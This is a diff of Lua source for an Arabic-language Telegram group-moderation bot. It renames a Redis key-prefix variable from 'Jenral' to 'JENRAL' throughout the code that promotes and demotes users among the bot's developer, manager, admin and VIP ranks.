+if DevALI:sismember(JENRAL..'ALI:SecondSudo:',result.sender_user_id_) then
 secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
-if DevALI:sismember(Jenral..'ALI:SudoBot:',result.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:SudoBot:',result.sender_user_id_) then
 sudobot = 'المطورين • ' else sudobot = '' end
-if DevALI:sismember(Jenral..'ALI:ManagerAll:',result.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:ManagerAll:',result.sender_user_id_) then
 managerall = 'المدراء العامين • ' else managerall = '' end
-if DevALI:sismember(Jenral..'ALI:AdminAll:',result.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:AdminAll:',result.sender_user_id_) then
 adminall = 'الادمنيه العامين • ' else adminall = '' end
-if DevALI:sismember(Jenral..'ALI:VipAll:',result.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:VipAll:',result.sender_user_id_) then
 vpall = 'المميزين العامين • ' else vpall = '' end
-if DevALI:sismember(Jenral..'ALI:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
 basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
-if DevALI:sismember(Jenral..'ALI:Constructor:'..msg.chat_id_, result.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:Constructor:'..msg.chat_id_, result.sender_user_id_) then
 constructor = 'المنشئين • ' else constructor = '' end 
-if DevALI:sismember(Jenral..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_) then
 manager = 'المدراء • ' else manager = '' end
-if DevALI:sismember(Jenral..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_) then
 admins = 'الادمنيه • ' else admins = '' end
-if DevALI:sismember(Jenral..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_) then
 vipmem = 'المميزين • ' else vipmem = '' end
-if DevALI:sismember(Jenral..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
 cleaner = 'المنظفين • ' else cleaner = ''
 end
 if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
@@ -4528,59 +4516,59 @@ else
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙لم تتم ترقيته مسبقا")  
 end
 if ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
-DevALI:srem(Jenral..'ALI:SecondSudo:', result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:SudoBot:', result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:ManagerAll:', result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:AdminAll:', result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:VipAll:', result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:SecondSudo:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:SudoBot:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:ManagerAll:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:AdminAll:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipAll:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_)
 elseif ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
-DevALI:srem(Jenral..'ALI:SudoBot:', result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:ManagerAll:', result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:AdminAll:', result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:VipAll:', result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:SudoBot:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:ManagerAll:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:AdminAll:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipAll:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_)
 elseif ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
-DevALI:srem(Jenral..'ALI:ManagerAll:', result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:AdminAll:', result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:VipAll:', result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:ManagerAll:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:AdminAll:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipAll:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_)
 elseif ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'ALIconstructor' then
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_)
 elseif ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_)
 elseif ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_, result.sender_user_id_)
 elseif ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
 end
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
@@ -4593,27 +4581,27 @@ if SudoId(result.id_) == true then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
 return false 
 end
-if DevALI:sismember(Jenral..'ALI:SecondSudo:',result.id_) then
+if DevALI:sismember(JENRAL..'ALI:SecondSudo:',result.id_) then
 secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
-if DevALI:sismember(Jenral..'ALI:SudoBot:',result.id_) then
+if DevALI:sismember(JENRAL..'ALI:SudoBot:',result.id_) then
 sudobot = 'المطورين • ' else sudobot = '' end
-if DevALI:sismember(Jenral..'ALI:ManagerAll:',result.id_) then
+if DevALI:sismember(JENRAL..'ALI:ManagerAll:',result.id_) then
 managerall = 'المدراء العامين • ' else managerall = '' end
-if DevALI:sismember(Jenral..'ALI:AdminAll:',result.id_) then
+if DevALI:sismember(JENRAL..'ALI:AdminAll:',result.id_) then
 adminall = 'الادمنيه العامين • ' else adminall = '' end
-if DevALI:sismember(Jenral..'ALI:VipAll:',result.id_) then
+if DevALI:sismember(JENRAL..'ALI:VipAll:',result.id_) then
 vpall = 'المميزين العامين • ' else vpall = '' end
-if DevALI:sismember(Jenral..'ALI:BasicConstructor:'..msg.chat_id_, result.id_) then
+if DevALI:sismember(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_, result.id_) then
 basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
-if DevALI:sismember(Jenral..'ALI:Constructor:'..msg.chat_id_, result.id_) then
+if DevALI:sismember(JENRAL..'ALI:Constructor:'..msg.chat_id_, result.id_) then
 constructor = 'المنشئين • ' else constructor = '' end 
-if DevALI:sismember(Jenral..'ALI:Managers:'..msg.chat_id_, result.id_) then
+if DevALI:sismember(JENRAL..'ALI:Managers:'..msg.chat_id_, result.id_) then
 manager = 'المدراء • ' else manager = '' end
-if DevALI:sismember(Jenral..'ALI:Admins:'..msg.chat_id_, result.id_) then
+if DevALI:sismember(JENRAL..'ALI:Admins:'..msg.chat_id_, result.id_) then
 admins = 'الادمنيه • ' else admins = '' end
-if DevALI:sismember(Jenral..'ALI:VipMem:'..msg.chat_id_, result.id_) then
+if DevALI:sismember(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.id_) then
 vipmem = 'المميزين • ' else vipmem = '' end
-if DevALI:sismember(Jenral..'ALI:Cleaner:'..msg.chat_id_, result.id_) then
+if DevALI:sismember(JENRAL..'ALI:Cleaner:'..msg.chat_id_, result.id_) then
 cleaner = 'المنظفين • ' else cleaner = ''
 end
 if RankChecking(result.id_,msg.chat_id_) ~= false then
@@ -4622,58 +4610,58 @@ else
 ReplyStatus(msg,result.id_,"Reply","⌁︙لم تتم ترقيته مسبقا")  
 end 
 if ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
-DevALI:srem(Jenral..'ALI:SecondSudo:', result.id_)
-DevALI:srem(Jenral..'ALI:SudoBot:', result.id_)
-DevALI:srem(Jenral..'ALI:ManagerAll:', result.id_)
-DevALI:srem(Jenral..'ALI:AdminAll:', result.id_)
-DevALI:srem(Jenral..'ALI:VipAll:', result.id_)
-DevALI:srem(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,result.id_)
-DevALI:srem(Jenral..'ALI:Constructor:'..msg.chat_id_,result.id_)
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:SecondSudo:', result.id_)
+DevALI:srem(JENRAL..'ALI:SudoBot:', result.id_)
+DevALI:srem(JENRAL..'ALI:ManagerAll:', result.id_)
+DevALI:srem(JENRAL..'ALI:AdminAll:', result.id_)
+DevALI:srem(JENRAL..'ALI:VipAll:', result.id_)
+DevALI:srem(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_, result.id_)
 elseif ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
-DevALI:srem(Jenral..'ALI:SudoBot:', result.id_)
-DevALI:srem(Jenral..'ALI:ManagerAll:', result.id_)
-DevALI:srem(Jenral..'ALI:AdminAll:', result.id_)
-DevALI:srem(Jenral..'ALI:VipAll:', result.id_)
-DevALI:srem(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,result.id_)
-DevALI:srem(Jenral..'ALI:Constructor:'..msg.chat_id_,result.id_)
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:SudoBot:', result.id_)
+DevALI:srem(JENRAL..'ALI:ManagerAll:', result.id_)
+DevALI:srem(JENRAL..'ALI:AdminAll:', result.id_)
+DevALI:srem(JENRAL..'ALI:VipAll:', result.id_)
+DevALI:srem(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_, result.id_)
 elseif ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
-DevALI:srem(Jenral..'ALI:ManagerAll:', result.id_)
-DevALI:srem(Jenral..'ALI:AdminAll:', result.id_)
-DevALI:srem(Jenral..'ALI:VipAll:', result.id_)
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:Constructor:'..msg.chat_id_,result.id_)
-DevALI:srem(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,result.id_)
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:ManagerAll:', result.id_)
+DevALI:srem(JENRAL..'ALI:AdminAll:', result.id_)
+DevALI:srem(JENRAL..'ALI:VipAll:', result.id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_, result.id_)
 elseif ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'ALIconstructor' then
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:Constructor:'..msg.chat_id_,result.id_)
-DevALI:srem(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,result.id_)
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_, result.id_)
 elseif ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:Constructor:'..msg.chat_id_,result.id_)
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_, result.id_)
 elseif ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.id_)
 elseif ALIDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.id_)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.id_)
 end
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙المعرف غير صحيح*', 1, 'md')
@@ -4681,12 +4669,12 @@ end
 end
 resolve_username(rem[2],remm)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --     Set SecondSudo     --
 if Sudo(msg) then
 if text ==('اضف مطور ثانوي') or text ==('رفع مطور ثانوي') and SourceCh(msg) then
 function sudo_reply(extra, result, success)
-DevALI:sadd(Jenral..'ALI:SecondSudo:',result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:SecondSudo:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المطورين الثانويين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4696,7 +4684,7 @@ if text and (text:match('^اضف مطور ثانوي @(.*)') or text:match('^ر�
 local username = text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:sadd(Jenral..'ALI:SecondSudo:',result.id_)
+DevALI:sadd(JENRAL..'ALI:SecondSudo:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المطورين الثانويين")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4705,14 +4693,14 @@ resolve_username(username,promreply)
 end
 if text and (text:match('^اضف مطور ثانوي (%d+)') or text:match('^رفع مطور ثانوي (%d+)')) and SourceCh(msg) then
 local user = text:match('اضف مطور ثانوي (%d+)') or text:match('رفع مطور ثانوي (%d+)')
-DevALI:sadd(Jenral..'ALI:SecondSudo:',user)
+DevALI:sadd(JENRAL..'ALI:SecondSudo:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المطورين الثانويين")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --     Rem SecondSudo     --
 if text ==('حذف مطور ثانوي') or text ==('تنزيل مطور ثانوي') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevALI:srem(Jenral..'ALI:SecondSudo:',result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:SecondSudo:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المطورين الثانويين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4722,7 +4710,7 @@ if text and (text:match('^حذف مطور ثانوي @(.*)') or text:match('^ت�
 local username = text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:srem(Jenral..'ALI:SecondSudo:',result.id_)
+DevALI:srem(JENRAL..'ALI:SecondSudo:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المطورين الثانويين")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4731,15 +4719,15 @@ resolve_username(username,promreply)
 end
 if text and (text:match('^حذف مطور ثانوي (%d+)') or text:match('^تنزيل مطور ثانوي (%d+)')) and SourceCh(msg) then
 local user = text:match('حذف مطور ثانوي (%d+)') or text:match('تنزيل مطور ثانوي (%d+)')
-DevALI:srem(Jenral..'ALI:SecondSudo:',user)
+DevALI:srem(JENRAL..'ALI:SecondSudo:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المطورين الثانويين")  
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 --       Set SudoBot      --
 if SecondSudo(msg) then
 if text ==('اضف مطور') or text ==('رفع مطور') and SourceCh(msg) then
 function sudo_reply(extra, result, success)
-DevALI:sadd(Jenral..'ALI:SudoBot:',result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:SudoBot:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المطورين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4749,7 +4737,7 @@ if text and (text:match('^اضف مطور @(.*)') or text:match('^رفع مطو�
 local username = text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:sadd(Jenral..'ALI:SudoBot:',result.id_)
+DevALI:sadd(JENRAL..'ALI:SudoBot:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المطورين")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4758,14 +4746,14 @@ resolve_username(username,promreply)
 end
 if text and (text:match('^اضف مطور (%d+)') or text:match('^رفع مطور (%d+)')) and SourceCh(msg) then
 local user = text:match('اضف مطور (%d+)') or text:match('رفع مطور (%d+)')
-DevALI:sadd(Jenral..'ALI:SudoBot:',user)
+DevALI:sadd(JENRAL..'ALI:SudoBot:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المطورين")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --       Rem SudoBot      --
 if text ==('حذف مطور') or text ==('تنزيل مطور') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevALI:srem(Jenral..'ALI:SudoBot:',result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:SudoBot:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المطورين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4775,7 +4763,7 @@ if text and (text:match('^حذف مطور @(.*)') or text:match('^تنزيل م�
 local username = text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:srem(Jenral..'ALI:SudoBot:',result.id_)
+DevALI:srem(JENRAL..'ALI:SudoBot:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المطورين")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4784,15 +4772,15 @@ resolve_username(username,promreply)
 end
 if text and (text:match('^حذف مطور (%d+)') or text:match('^تنزيل مطور (%d+)')) and SourceCh(msg) then
 local user = text:match('حذف مطور (%d+)') or text:match('تنزيل مطور (%d+)')
-DevALI:srem(Jenral..'ALI:SudoBot:',user)
+DevALI:srem(JENRAL..'ALI:SudoBot:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المطورين")  
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 --      Set ManagerAll    --
 if SudoBot(msg) then
 if text ==('رفع مدير عام') and SourceCh(msg) then
 function raf_reply(extra, result, success)
-DevALI:sadd(Jenral..'ALI:ManagerAll:',result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:ManagerAll:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المدراء العامين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4802,7 +4790,7 @@ if text and text:match('^رفع مدير عام @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع مدير عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:sadd(Jenral..'ALI:ManagerAll:',result.id_)
+DevALI:sadd(JENRAL..'ALI:ManagerAll:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المدراء العامين")  
 else 
